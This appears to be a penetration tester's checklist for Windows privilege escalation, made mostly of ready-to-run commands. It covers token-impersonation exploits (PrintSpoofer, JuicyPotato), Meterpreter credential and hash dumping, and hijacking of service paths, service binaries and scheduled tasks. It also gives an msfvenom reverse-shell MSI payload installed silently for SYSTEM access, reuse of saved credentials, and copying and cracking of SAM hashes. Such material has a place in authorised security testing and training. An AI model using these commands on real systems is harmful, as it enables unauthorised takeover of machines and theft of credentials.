# ⬆️ WINDOWS PRIVILEGE ESCALATION CHECKLIST

---

## CHECK 1: Current User Info
```cmd
whoami
whoami /priv
whoami /groups
net user
systeminfo
```

## CHECK 2: Dangerous Privileges
| Privilege | Exploit |
|---|---|
| `SeImpersonatePrivilege` | PrintSpoofer / JuicyPotato |
| `SeAssignPrimaryToken` | JuicyPotato |
| `SeBackupPrivilege` | Copy SAM/SYSTEM files |
| `SeDebugPrivilege` | Dump LSASS |

```bash
# PrintSpoofer
PrintSpoofer.exe -i -c cmd
# JuicyPotato
JuicyPotato.exe -l 1337 -p cmd.exe -t *
```

## CHECK 3: Meterpreter → SYSTEM
```bash
meterpreter > getsystem
meterpreter > load kiwi
meterpreter > creds_all
meterpreter > hashdump
```

## CHECK 4: Unquoted Service Paths
```cmd
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"
```
> Unquoted path with spaces? → place malicious exe in path

## CHECK 5: Writable Service Binary
```cmd
accesschk.exe /accepteula -uwcqv "Authenticated Users" *
sc qc <SERVICE_NAME>
# Replace service binary → restart → SYSTEM
```

## CHECK 6: Scheduled Tasks
```cmd
schtasks /query /fo TABLE /nh
# Writable task script? → replace with payload
```

## CHECK 7: Registry AutoRun
```cmd
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
```

## CHECK 8: AlwaysInstallElevated
```cmd
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# Both = 1? → msfvenom MSI payload → instant SYSTEM
msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=4444 -f msi -o shell.msi
msiexec /quiet /qn /i shell.msi
```

## CHECK 9: Stored Credentials
```cmd
cmdkey /list
# Saved creds? → runas:
runas /savecred /user:Administrator cmd.exe
```

## CHECK 10: SAM/SYSTEM Backup Files
```cmd
dir /s /b C:\Windows\repair\SAM
dir /s /b C:\Windows\System32\config\RegBack\SAM
# Found? → copy → samdump2 → crack hashes
```

## CHECK 11: WinPEAS (All-in-One)
```cmd
winPEASx64.exe
```
